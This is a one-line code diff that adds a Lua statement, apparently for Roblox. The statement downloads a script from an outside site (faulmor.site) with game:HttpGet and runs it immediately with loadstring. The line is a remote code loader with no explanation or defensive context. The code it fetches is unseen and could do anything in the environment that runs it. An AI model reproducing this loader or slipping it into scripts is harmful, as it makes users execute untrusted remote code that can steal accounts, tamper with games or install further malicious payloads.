@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://faulmor.site/v2/029b623126b4731700401e24abc1bb54/lua"))()
